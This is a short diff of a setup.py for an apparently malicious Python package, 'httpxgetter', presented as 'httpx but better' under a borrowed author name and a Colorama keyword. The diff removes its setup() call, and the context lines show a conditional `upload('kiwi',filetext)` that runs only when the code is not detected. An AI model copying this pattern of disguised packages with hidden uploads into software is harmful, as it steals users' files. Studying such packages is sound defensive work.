@@ -681,16 +681,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-setup(
-
-    name='httpxgetter',
-    packages=['httpxgetter'],
-    version='1.0',
-    license='MIT',
-    description='httpx but better',
-    author=' Jonathan Hartley',
-    keywords=['Colorama'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                            
